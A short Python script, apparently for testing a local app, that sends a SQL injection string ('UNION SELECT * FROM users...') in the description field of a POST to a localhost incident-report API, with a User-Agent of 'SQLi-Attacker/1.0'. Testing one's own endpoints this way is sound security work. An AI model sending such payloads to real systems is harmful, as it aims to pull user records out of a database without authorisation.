# sql_injection_attack.py
import requests

url = "http://localhost:3000/api/incidents/report"
headers = {
    "Content-Type": "application/json",
    "Origin": "http://localhost:3001",
    "User-Agent": "SQLi-Attacker/1.0",
    # "Authorization": "Bearer <your_token>"
}
payload = {
    "title": "SQL Injection",
    "description": "UNION SELECT * FROM users WHERE '1'='1'"
}

response = requests.post(url, json=payload, headers=headers)
print("Status Code:", response.status_code)
print("Response:", response.json())
